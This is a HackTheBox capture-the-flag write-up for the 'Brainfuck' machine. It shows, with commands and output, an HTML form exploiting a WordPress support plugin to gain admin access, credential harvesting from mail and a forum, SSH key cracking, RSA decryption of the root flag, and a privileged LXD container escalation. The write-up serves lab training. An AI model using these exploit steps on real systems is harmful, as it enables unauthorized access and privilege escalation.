---
layout: post
title: HackTheBox Brainfuck
date: 2017-04-29
tags: [HackTheBox, Linux, Insane]
---

# Machine Synopsis

Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many. ([Source](https://www.hackthebox.com/machines/brainfuck))

# Enumeration

```bash
$ nmap -p- --min-rate 10000 10.10.10.17 

PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https

$ nmap -p 22,25,110,143,443 -sCV 10.10.10.17

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES USER SASL(PLAIN) AUTH-RESP-CODE CAPA UIDL TOP PIPELINING
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: post-login capabilities SASL-IR LITERAL+ ENABLE more IMAP4rev1 IDLE LOGIN-REFERRALS listed have ID OK Pre-login AUTH=PLAINA0001
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![default_ip_website.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/default_ip_website.png?raw=true?raw=true)

Looking at the `nmap` scan, it shows the common name of `brainfuck.htb` and it’s subdomains. Lets add the following to our `/etc/hosts`.

```bash
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

![https_website.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/https_website.png?raw=true)

Viewing the TLS certificate of https://brainfuck.htb shows the following details.

```
emailAddress = orestis@brainfuck.htb
CN = brainfuck.htb
OU = IT
O = Brainfuck Ltd.
L = Athens
ST = Attica
C = GR
```

```bash
$ wpscan --url https://brainfuck.htb --disable-tls-checks
...
[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
...

$ searchsploit wordpress support plus     
...
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                   | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                     | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                            | php/webapps/40939.txt
...
```

Reading `41006.txt`, I crafted the following malicious html.

```html
cat hehe.html     
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="orestis@brainfuck.htb">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

![malicious_html.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/malicious_html.png?raw=true)

After clicking login on our malicious html, we can go to `https://brainfuck.htb/wp-admin/admin-ajax.php` and then go to `https://brainfuck.htb/`. This will allow us to become admin user.

![brainfuck_admin.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/brainfuck_admin.png?raw=true)

# Exploitation

While enumerating through the plugins installed on WordPress, we found an SMTP password on WP SMTP: `orestis:kHGuERB29DNiNE`.

![wp_plugins.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/wp_plugins.png?raw=true)

![wp_admin_dashboard.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/wp_admin_dashboard.png?raw=true)

![wp_plugin_password.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/wp_plugin_password.png?raw=true)

Using this credentials, we can access the mailbox of `orestis` and look at his mailbox. Inside his mailbox was one interesting mail with another credentials for a “secret forum”: `orestis:kIEnnfEKJ#9UmdO`.

The credentials are for `sup3rs3cr3t.brainfuck.htb`.

![supersecret_website.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/supersecret_website.png?raw=true)

![supersecret_discussion.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/supersecret_discussion.png?raw=true)

![supersecret_admin_login.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/supersecret_admin_login.png?raw=true)

![supersecret_ssh_access.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/supersecret_ssh_access.png?raw=true)

Reading the secret thread, we observed that `orestis` opened up a new encrypted thread. The line `` below appears to be the key to the encryption.

![supersecret_keys.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/supersecret_keys.png?raw=true)

Reading the encrypted thread, we noticed a similar looking sentence:`Pieagnm - Jkoijeg nbw zwx mle grwsnn`. This is similar to `Orestis - Hacking for fun and profit`.

Looking around for hints, this was a Vigenere Cipher.

![vigenere_cipher.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/vigenere_cipher.png?raw=true)

The decoded plaintext seems to be `BrainfuCkmybrainfuckmybrainfu`. Most probably the key is `fuckmybrain`.

![vigenere_cipher_2.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/vigenere_cipher_2.png?raw=true)

Reading the plaintext, it looks like we can find a `ssh` key in the following link: `https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa`.

The `id_rsa` file turns out to be encrypted. Therefore, we had to crack the hash in order to find the password for the `id_rsa` file. 

```bash
$ cat id_rsa   
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
...
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----

$ ssh2john id_rsa >> hash

$ cat hash     
id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c0...

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
...
3poulakia!       (id_rsa)    
...
```

Great! We cracked the password: `3poulakia!`. 

```bash
$ chmod 600 id_rsa

$ ssh -i id_rsa orestis@10.10.10
Enter passphrase for key 'id_rsa': 3poulakia!
...
You have mail.
Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
orestis@brainfuck:~$ groups
orestis adm cdrom dip plugdev lxd lpadmin sambashare
orestis@brainfuck:~$ hostname
brainfuck
orestis@brainfuck:~$ pwd
/home/orestis
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
orestis@brainfuck:~$ cat user.txt 
2c11cfbc5b959f73ac15a3310bd097c9
```

Now, it is time to escalate our privileges. We observed that there is a `encrypt.sage` file on `orestis` home directory. This looked like a RSA encryption with given `p`, `q` and `e`.

```bash
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

Lucky for us, there was a useful post on [stackexchange](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e) that can help us solve this problem.

```bash
# https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e
$ cat decrypt_rsa.py 
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()

    
$ python decrypt_rsa.py                                       
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750

$ python3                    
Python 3.11.8 [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> pt=24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> print(pt)
24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> hex(pt)
'0x3665666331613564626238393034373531636536353636613330356262386566'
```

Awesome! We found the hexadecimal encoding of the plaintext. Now we just have to convert it back to text.

![decoded_hex.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Brainfuck/decoded_hex.png?raw=true)

The root flag is `6efc1a5dbb8904751ce6566a305bb8ef`.

### Alternative method to get root.

```bash
# https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
orestis@brainfuck:~$ lxc list
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
orestis@brainfuck:~$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
orestis@brainfuck:~$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
orestis@brainfuck:~$ lxc image import bob.tar.bz2 --alias bobImage
Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d
orestis@brainfuck:~$ lxc init bobImage bobVM -c security.privileged=true
Creating bobVM
orestis@brainfuck:~$ lxc config device add bobVM realRoot disk source=/ path=r
Device realRoot added to bobVM
orestis@brainfuck:~$ lxc start bobVM
orestis@brainfuck:~$ lxc exec bobVM -- /bin/sh
# whoami
root
# cat /r/root/root.txt 
6efc1a5dbb8904751ce6566a305bb8ef
# exit
orestis@brainfuck:~$ lxc stop bobVM
orestis@brainfuck:~$ lxc delete bobVM
orestis@brainfuck:~$ lxc image delete bobImage
```

